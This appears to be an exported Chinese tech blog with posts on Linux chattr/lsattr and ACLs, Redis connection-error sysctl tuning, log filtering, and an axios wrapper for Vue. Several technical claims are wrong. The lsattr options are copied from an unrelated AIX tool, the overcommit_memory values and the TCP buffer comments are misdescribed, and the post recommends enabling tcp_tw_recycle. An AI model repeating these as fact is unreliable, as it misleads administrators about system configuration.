<li>-v&lt;版本编号&gt;：设置文件或目录版本；</li>
<li>-V：显示指令执行过程；</li>
<li>+&lt;属性&gt;：开启文件或目录的该项属性；</li>
<li>-&lt;属性&gt;：关闭文件或目录的该项属性；</li>
<li>=&lt;属性&gt;：指定文件或目录的该项属性。</li>
</ul>
<p>新建一个普通文件，并为其设置不允许删除与覆盖（+a参数）权限，然后再尝试将这个文件删除：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root@linuxprobe ~</span>]<span class="meta"># echo &quot;for Test&quot; &gt; linuxprobe</span></span><br><span class="line">[<span class="meta">root@linuxprobe ~</span>]<span class="meta"># chattr +a linuxprobe</span></span><br><span class="line">[<span class="meta">root@linuxprobe ~</span>]<span class="meta"># rm linuxprobe</span></span><br><span class="line">rm: <span class="keyword">remove</span> regular file ‘linuxprobe’? y</span><br><span class="line">rm: cannot <span class="keyword">remove</span> ‘linuxprobe’: Operation <span class="keyword">not</span> permitted</span><br></pre></td></tr></table></figure>

<h3 id="lsattr-命令"><a href="#lsattr-命令" class="headerlink" title="lsattr 命令"></a>lsattr 命令</h3><p>lsattr命令用于显示文件的隐藏权限，格式为“lsattr [参数] 文件”。</p>
<ul>
<li>-E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。</li>
<li>-D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。</li>
<li>-R：递归的操作方式；</li>
<li>-V：显示指令的版本信息；</li>
<li>-a：列出目录中的所有文件，包括隐藏文件。</li>
</ul>
<p>lsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。</p>
<p>在Linux系统中，文件的隐藏权限必须使用lsattr命令来查看，平时使用的ls之类的命令则看不出端倪</p>
<p>一旦使用lsattr命令后，文件上被赋予的隐藏权限马上就会原形毕露。此时可以按照显示的隐藏权限的类型（字母），使用chattr命令将其去掉：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">[root@linuxprobe ~]<span class="comment"># lsattr linuxprobe</span></span><br><span class="line"><span class="comment">-----a---------- linuxprobe</span></span><br><span class="line">[root@linuxprobe ~]<span class="comment"># chattr -a linuxprobe</span></span><br><span class="line">[root@linuxprobe ~]<span class="comment"># lsattr linuxprobe </span></span><br><span class="line"><span class="comment">---------------- linuxprobe</span></span><br><span class="line">[root@linuxprobe ~]<span class="comment"># rm linuxprobe </span></span><br><span class="line">rm: remove regular <span class="built_in">file</span> ‘linuxprobe’? y</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux文件访问控制列表</title>
    <url>/post/36849/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果希望对某个指定的用户进行单独的权限控制，就需要用到文件的访问控制列表（ACL）了。通俗来讲，基于普通文件或目录设置ACL其实就是针对指定的用户或用户组设置文件或目录的操作权限。另外，如果针对某个目录设置了ACL，则目录中的文件会继承其ACL；若针对文件设置了ACL，则文件不再继承其所在目录的ACL。</p>
<span id="more"></span>

<h3 id="setfacl-命令"><a href="#setfacl-命令" class="headerlink" title="setfacl 命令"></a>setfacl 命令</h3><p>setfacl命令用于管理文件的ACL规则，格式为“setfacl [参数] 文件名称”。</p>
<p>文件的ACL提供的是在所有者、所属组、其他人的读/写/执行权限之外的特殊权限控制，使用setfacl命令可以针对单一用户或用户组、单一文件或目录来进行读/写/执行权限的控制。</p>
<p>其中，针对目录文件需要使用-R递归参数；针对普通文件则使用-m参数；如果想要删除某个文件的ACL，则可以使用-b参数。</p>
<p>设置用户在/root目录上的权限：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@linuxprobe ~]<span class="comment"># setfacl -Rm u:linuxprobe:rwx /root</span></span><br><span class="line">[root@linuxprobe ~]<span class="comment"># su - linuxprobe</span></span><br><span class="line">Last login: Sat Mar <span class="number">21</span> <span class="number">15</span>:<span class="number">45</span>:<span class="number">03</span> CST <span class="number">2017</span> on pts/<span class="number">1</span></span><br><span class="line">[linuxprobe@linuxprobe ~]$ cd /root</span><br><span class="line">[linuxprobe@linuxprobe root]$ ls</span><br><span class="line">anaconda-ks.cfg Downloads Pictures Public</span><br><span class="line">[linuxprobe@linuxprobe root]$ cat anaconda-ks.cfg</span><br><span class="line">[linuxprobe@linuxprobe root]$ <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>常用的ls命令是看不到ACL表信息的，但是却可以看到文件的权限最后一个点（.）变成了加号（+）,这就意味着该文件已经设置了ACL了。</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">[root@linuxprobe ~]<span class="comment"># ls -ld /root</span></span><br><span class="line">dr-xrwx---+<span class="number"> 14 </span>root root<span class="number"> 4096 </span>May<span class="number"> 4 </span>2017 /root</span><br></pre></td></tr></table></figure>


<h3 id="getfacl-命令"><a href="#getfacl-命令" class="headerlink" title="getfacl 命令"></a>getfacl 命令</h3><p>getfacl命令用于显示文件上设置的ACL信息，格式为“getfacl 文件名称”。</p>
<p>想要设置ACL，用的是setfacl命令；要想查看ACL，则用的是getfacl命令。</p>
<p>使用getfacl命令显示在root管理员家目录上设置的所有ACL信息。</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">[root@linuxprobe ~]<span class="meta"># getfacl /root</span></span><br><span class="line"><span class="symbol">getfacl:</span> Removing leading <span class="string">&#x27;/&#x27;</span> from absolute path names</span><br><span class="line"><span class="meta"># file: root</span></span><br><span class="line"><span class="meta"># owner: root</span></span><br><span class="line"><span class="meta"># group: root</span></span><br><span class="line"><span class="symbol">user:</span>:r-<span class="built_in">x</span></span><br><span class="line"><span class="symbol">user:</span>linuxprobe:rwx</span><br><span class="line"><span class="symbol">group:</span>:r-<span class="built_in">x</span></span><br><span class="line"><span class="symbol">mask:</span>:rwx</span><br><span class="line"><span class="symbol">other:</span>:---</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis由于连接过多导致的异常</title>
    <url>/post/16422/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近期服务器在高峰的时候经常报错，日志记录为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis-&gt;connect(&#x27;127.0.0.1&#x27;, 6379)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in /wwwroot/test.php on line 9</span><br><span class="line">[13-Jun-2019 11:07:47 PRC] PHP Fatal error:  Uncaught RedisException: Cannot assign requested address in /wwwroot/test.php:9</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>执行命令修改如下 2 个内核参数  </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_timestamps=1 开启对于 TCP 时间戳的支持, 若该项设置为 0，则下面一项设置不起作用</span><br><span class="line"></span><br><span class="line">sysctl -w net.ipv4.tcp_tw_recycle=1 表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收</span><br><span class="line"></span><br><span class="line">Redis 错误 ：Cannot assign request</span><br><span class="line"></span><br><span class="line">Could not connect to Redis at 127.0.0.1:6379: connect: Cannot assign request</span><br></pre></td></tr></table></figure>

<p>经查官方 Wiki 是系统网络配置问题已经解决：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse</span><br></pre></td></tr></table></figure>

<p>以上需要 root 权限对网络进行配置。</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>通过调整内核参数解决，<code>vim /etc/sysctl.conf</code>，加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net.ipv4.tcp_syncookies = 1 #表示开启 SYN Cookies。当出现 SYN 等待队列溢出时，启用 cookies 来处理，可防范少量 SYN 攻击，默认为 0，表示关闭；</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_tw_reuse = 1 #表示开启重用。允许将 TIME-WAIT sockets 重新用于新的 TCP 连接，默认为 0，表示关闭，释放 TIME_WAIT 端口给新连接使用；</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_tw_recycle = 1 #表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收资源，默认为 0，表示关闭。</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_fin_timeout = 30 #修改系統默认的 TIMEOUT 时间，调低端口释放后的等待时间，默认为 60s，修改为 15~30s</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_max_tw_buckets = 10000# 通过设置它，系统会将多余的 TIME_WAIT 删除掉，此时系统日志里可能会显示：『TCP: time wait bucket table overflow』，多数情况下不用在意这些信息。</span><br></pre></td></tr></table></figure>

<p>然后执行 <code>/sbin/sysctl -p</code> 让参数生效。</p>
<p>以上都可以通过命令（sysctl -w）方式操作，如：<code>sysctl -w net.ipv4.tcp_fin_timeout=30</code> ，只适合临时修改参数。</p>
<h3 id="TCP-网络参数优化"><a href="#TCP-网络参数优化" class="headerlink" title="TCP 网络参数优化"></a>TCP 网络参数优化</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1024 65535&quot;</span> &gt; /proc/sys/net/ipv4/ip_local_port_range 设置向外连接可用端口范围 表示可以使用的端口为 65535-1024 个（0~1024 为受保护的)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse 设置 time_wait 连接重用 默认 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_recycle 设置快速回收 time_wait 连接 默认 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 180000 &gt; /proc/sys/net/ipv4/tcp_max_tw_buckets 设置最大 time_wait 连接长度 默认 262144</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_timestamps  设置是否启用比超时重发更精确的方法来启用对 RTT 的计算 默认 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_window_scaling 设置 TCP/IP 会话的滑动窗口大小是否可变 默认 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 20000 &gt; /proc/sys/net/ipv4/tcp_max_syn_backlog 设置最大处于等待客户端没有应答的连接数 默认 2048</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 15 &gt; /proc/sys/net/ipv4/tcp_fin_timeout  设置 FIN-WAIT 状态等待回收时间 默认 60</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;4096 87380 16777216&quot;</span> &gt; /proc/sys/net/ipv4/tcp_rmem  设置最大 TCP 数据发送缓冲大小，分别为最小、默认和最大值  默认 4096    87380   4194304</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;4096 65536 16777216&quot;</span> &gt; /proc/sys/net/ipv4/tcp_wmem 设置最大 TCP 数据 接受缓冲大小，分别为最小、默认和最大值 　默认 4096    87380   4194304</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 10000 &gt; /proc/sys/net/core/somaxconn  设置每一个处于监听状态的端口的监听队列的长度 默认 128</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 10000 &gt; /proc/sys/net/core/netdev_max_backlog 设置最大等待 cpu 处理的包的数目 默认 1000</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 16777216 &gt; /proc/sys/net/core/rmem_max 设置最大的系统套接字数据接受缓冲大小 默认 124928</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 262144 &gt; /proc/sys/net/core/rmem_default  设置默认的系统套接字数据接受缓冲大小 默认 124928</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 16777216 &gt; /proc/sys/net/core/wmem_max  设置最大的系统套接字数据发送缓冲大小 默认 124928</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 262144 &gt; /proc/sys/net/core/wmem_default  设置默认的系统套接字数据发送缓冲大小 默认 124928</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 2000000 &gt; /proc/sys/fs/file-max 设置最大打开文件数 默认 385583</span><br></pre></td></tr></table></figure>

<p>结合 ab 命令来压测机器优化网络，设置完记得保存</p>
<h3 id="优化-Redis-命令"><a href="#优化-Redis-命令" class="headerlink" title="优化 Redis 命令"></a>优化 Redis 命令</h3><p>设置内存分配方式：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo <span class="number">1</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/vm/</span>overcommit_memory</span><br></pre></td></tr></table></figure>

<p>0 表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。</p>
<p>1 表示内核允许分配所有的物理内存，而不管当前的内存状态如何。</p>
<p>2 表示内核允许分配超过所有物理内存和交换空间总和的内存</p>
<p>关闭 THP：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cho never &gt; <span class="regexp">/sys/</span>kernel<span class="regexp">/mm/</span>transparent_hugepage/enabled</span><br></pre></td></tr></table></figure>

<p>尽管 THP 的本意是为提升性能，但某些数据库厂商还是建议直接关闭 THP(比如说 Oracle、MongoDB 等)，否则可能导致性能下降，内存锁，甚至系统重启等问题。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo <span class="number">1024</span> &gt;<span class="regexp">/proc/</span>sys<span class="regexp">/net/</span>core/somaxconn</span><br></pre></td></tr></table></figure>

<p>限制了接收新 TCP 连接侦听队列的大小。对于一个经常处理新连接的高负载 web 服务环境来说，默认的 128 太小了。大多数环境这个值建议增加到 1024 或者更多。 服务进程会自己限制侦听队列的大小 (例如 sendmail(8) 或者 Apache)，常常在它们的配置文件中有设置队列大小的选项。大的侦听队列对防止拒绝服务 DoS 攻击也会有所帮助。</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>网站访问日志的日常操作</title>
    <url>/post/63154/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>日常工作中，网站如果遇到异常情况，经常需要查看访问日志来查找问题，由于日志文件庞大查找起来很不放便，所以需要进行一些过滤处理</p>
<span id="more"></span>

<h3 id="筛选出可疑IP的访问日志"><a href="#筛选出可疑IP的访问日志" class="headerlink" title="筛选出可疑IP的访问日志"></a>筛选出可疑IP的访问日志</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> example.<span class="built_in">log</span> | <span class="keyword">grep</span> <span class="string">&#x27;127.0.0.1&#x27;</span> &gt; <span class="number">127.0</span>.<span class="number">0.1</span>.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<h3 id="筛选出日志的某一列数据"><a href="#筛选出日志的某一列数据" class="headerlink" title="筛选出日志的某一列数据"></a>筛选出日志的某一列数据</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">awk -F <span class="string">&quot;,&quot;</span> &#x27;&#123;<span class="keyword">print</span> <span class="variable">$2</span><span class="string">&quot; &quot;</span><span class="variable">$3</span>&quot;&#125;&#x27; example.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>

<h3 id="根据某列数据进行去重"><a href="#根据某列数据进行去重" class="headerlink" title="根据某列数据进行去重"></a>根据某列数据进行去重</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">awk</span> -F <span class="string">&quot;,&quot;</span>  <span class="string">&#x27;!a[<span class="variable">$2</span>,<span class="variable">$3</span>]++&#x27;</span>  example.log</span><br></pre></td></tr></table></figure>

<h3 id="去除重复行"><a href="#去除重复行" class="headerlink" title="去除重复行"></a>去除重复行</h3><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> <span class="built_in">example</span>.<span class="built_in">log</span> | uniq</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 中 axios 的封装</title>
    <url>/post/11917/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>虽然，axios 是个优秀的 HTTP 库，但是，直接在项目中使用并不是那么方便，所以，我们需要对其进行一定程度上的配置封装，减少重复代码，方便调用。</p>
<span id="more"></span>

<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>其实，网上关于 axios 封装的代码不少，但是大部分都是在入口文件（main.js）中进行 axios 全局对象属性定义的形式进行配置，类似于如下代码：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">axios.defaults.timeout</span> = <span class="number">10000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该方案有两个不足，首先，axios 封装代码耦合进入入口文件，不方便后期维护；其次，使用 axios 全局对象属性定义的方式进行配置，代码过于零散。</p>
<p>针对问题一，我使用了 Vue 源码结构中的一大核心思想——将功能拆分为文件，方便后期的维护。单独创建一个 <code>http.js</code> 或者 <code>http.ts</code> 文件，在文件中引入 axios 并对其进行封装配置，最后将其导出并挂载到 Vue 的原型上即可。此时，每次修改 axios 配置，只需要修改对应的文件即可，不会影响到不相关的功能。</p>
<p>针对问题二，采用 axios 官方推荐的，通过配置项创建 axios 实例的方式进行配置封装。</p>
<p>代码如下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> http.js</span><br><span class="line">import axios from <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="regexp">//</span> 创建 axios 实例</span><br><span class="line">const service = axios.create(&#123;</span><br><span class="line">  <span class="regexp">//</span> 配置项</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="根据环境设置-baseURL"><a href="#根据环境设置-baseURL" class="headerlink" title="根据环境设置 baseURL"></a>根据环境设置 baseURL</h3><p>baseURL 属性是请求地址前缀，将自动加在 url 前面，除非 url 是个绝对地址。正常情况下，在开发环境下和生产模式下有着不同的 baseURL，所以，我们需要根据不同的环境切换不同的 baseURL。</p>
<p>在开发模式下，由于有着 devServer 的存在，需要根据固定的 url 前缀进行请求地址重写，所以，在开发环境下，将 baseURL 设为某个固定的值，比如：<code>/apis</code>。</p>
<p>在生产模式下，根据 Java 模块的请求前缀的不同，可以设置不同的 baseURL。</p>
<p>具体代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据 process.env.NODE_ENV 区分状态，切换不同的 baseURL</span></span><br><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">	baseURL: process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span> ? <span class="string">`/java`</span> : <span class="string">&#x27;/apis&#x27;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="统一设置请求头"><a href="#统一设置请求头" class="headerlink" title="统一设置请求头"></a>统一设置请求头</h3><p>在这里和大家聊一个问题，什么是封装？在我看来，封装是通过更少的调用代码覆盖更多的调用场景。</p>
<p>由于，大部分情况下，请求头都是固定的，只有少部分情况下，会需要一些特殊的请求头，所以，在这里，我采用的方案是，将普适性的请求头作为基础配置。当需要特殊请求头时，将特殊请求头作为参数传入，覆盖基础配置。</p>
<p>代码如下：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">    ...</span><br><span class="line">	headers: &#123;</span><br><span class="line">        <span class="keyword">get</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=utf-8&#x27;</span></span><br><span class="line">          <span class="comment">// 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来</span></span><br><span class="line">        &#125;,</span><br><span class="line">        post: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span></span><br><span class="line">          <span class="comment">// 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来</span></span><br><span class="line">        &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="跨域、超时、响应码处理"><a href="#跨域、超时、响应码处理" class="headerlink" title="跨域、超时、响应码处理"></a>跨域、超时、响应码处理</h3><p>axios 中，提供是否允许跨域的属性——withCredentials，以及配置超时时间的属性——timeout，通过这两个属性，可以轻松处理跨域和超时的问题。</p>
<p>下面，我们来说说响应码处理：</p>
<p>axios 提供了 validateStatus 属性，用于定义对于给定的 HTTP 响应状态码是 resolve 或 reject promise。所以，正常设置的情况下，我们会将状态码为 2 系列或者 304 的请求设为 resolve 状态，其余为 reject 状态。结果就是，我们可以在业务代码里，使用 catch 统一捕获响应错误的请求，从而进行统一处理。</p>
<p>但是，由于我在代码里面使用了 async-await，而众所周知，async-await 捕获 catch 的方式极为麻烦，所以，在此处，我选择将所有响应都设为 resolve 状态，统一在 then 处理。</p>
<p>此部分代码如下：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">	<span class="comment">// 跨域请求时是否需要使用凭证</span></span><br><span class="line">	withCredentials: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 请求 30s 超时</span></span><br><span class="line">	timeout: <span class="number">30000</span>,</span><br><span class="line">	validateStatus: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="请求、响应处理"><a href="#请求、响应处理" class="headerlink" title="请求、响应处理"></a>请求、响应处理</h3><p>在不使用 axios 的情况下，每次请求或者接受响应，都需要将请求或者响应序列化。</p>
<p>而在 axios 中， <code>transformRequest</code> 允许在向服务器发送请求前，修改请求数据；<code>transformResponse</code> 在传递给 then/catch 前，允许修改响应数据。</p>
<p>通过这两个钩子，可以省去大量重复的序列化代码。</p>
<p>代码如下：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">    <span class="comment">// 在向服务器发送请求前，序列化请求数据</span></span><br><span class="line">    transformRequest: [function (<span class="keyword">data</span>) &#123;</span><br><span class="line">        <span class="keyword">data</span> = JSON.stringify(<span class="keyword">data</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">data</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="comment">// 在传递给 then/catch 前，修改响应数据</span></span><br><span class="line">    transformResponse: [function (<span class="keyword">data</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeof <span class="keyword">data</span> === <span class="string">&#x27;string&#x27;</span> &amp;&amp; <span class="keyword">data</span>.startsWith(<span class="string">&#x27;&#123;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">data</span> = JSON.parse(<span class="keyword">data</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">data</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>拦截器，分为请求拦截器以及响应拦截器，分别在请求或响应被 then 或 catch 处理前拦截它们。</p>
<p>之前提到过，由于 async-await 中 catch 难以处理的问题，所以将出错的情况也作为 resolve 状态进行处理。但这带来了一个问题，请求或响应出错的情况下，结果没有数据协议中定义的 msg 字段（消息）。所以，我们需要在出错的时候，手动生成一个符合返回格式的返回数据。</p>
<p>由于，在业务中，没有需要在请求拦截器中做额外处理的需求，所以，请求拦截器的 resolve 状态，只需直接返回就可以了。</p>
<p>请求拦截器代码如下：</p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line">// 请求拦截器</span><br><span class="line">service.interceptors.request.use(<span class="function"><span class="params">(config)</span> =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> config</span><br><span class="line">&#125;, <span class="function"><span class="params">(<span class="built_in">error</span>)</span> =&gt;</span> &#123;</span><br><span class="line">	// 错误抛到业务代码</span><br><span class="line">    <span class="built_in">error</span>.data = &#123;&#125;</span><br><span class="line">    <span class="built_in">error</span>.data.msg = <span class="string">&#x27;服务器异常，请联系管理员！&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> Promise.resolve(<span class="built_in">error</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再来聊聊响应拦截器，还是之前的那个问题，除了请求或响应错误，还有一种情况也会导致返回的消息体不符合协议规范，那就是状态码不为 2 系列或 304 时。此时，我们还是需要做一样的处理——手动生成一个符合返回格式的返回数据。但是，有一点不一样，我们还需要根据不同的状态码生成不同的提示信息，以方便处理上线后的问题。</p>
<p>响应拦截器代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据不同的状态码，生成不同的提示信息</span></span><br><span class="line"><span class="keyword">const</span> showStatus = <span class="function">(<span class="params">status</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">// 这一坨代码可以使用策略模式进行优化</span></span><br><span class="line">    <span class="keyword">switch</span> (status) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">400</span>:</span><br><span class="line">            message = <span class="string">&#x27;请求错误(400)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">401</span>:</span><br><span class="line">            message = <span class="string">&#x27;未授权，请重新登录(401)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">403</span>:</span><br><span class="line">            message = <span class="string">&#x27;拒绝访问(403)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">404</span>:</span><br><span class="line">            message = <span class="string">&#x27;请求出错(404)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">408</span>:</span><br><span class="line">            message = <span class="string">&#x27;请求超时(408)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">500</span>:</span><br><span class="line">            message = <span class="string">&#x27;服务器错误(500)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">501</span>:</span><br><span class="line">            message = <span class="string">&#x27;服务未实现(501)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">502</span>:</span><br><span class="line">            message = <span class="string">&#x27;网络错误(502)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">503</span>:</span><br><span class="line">            message = <span class="string">&#x27;服务不可用(503)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">504</span>:</span><br><span class="line">            message = <span class="string">&#x27;网络超时(504)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">505</span>:</span><br><span class="line">            message = <span class="string">&#x27;HTTP版本不受支持(505)&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            message = <span class="string">`连接出错(<span class="subst">$&#123;status&#125;</span>)!`</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;message&#125;</span>，请检查网络或联系管理员！`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 响应拦截器</span></span><br><span class="line">service.interceptors.response.use(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> status = response.status</span><br><span class="line">    <span class="keyword">let</span> msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (status &lt; <span class="number">200</span> || status &gt;= <span class="number">300</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理http错误，抛到业务代码</span></span><br><span class="line">        msg = showStatus(status)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> response.data === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            response.data = &#123; msg &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.data.msg = msg</span><br><span class="line">        &#125;</span><br><span class="line">    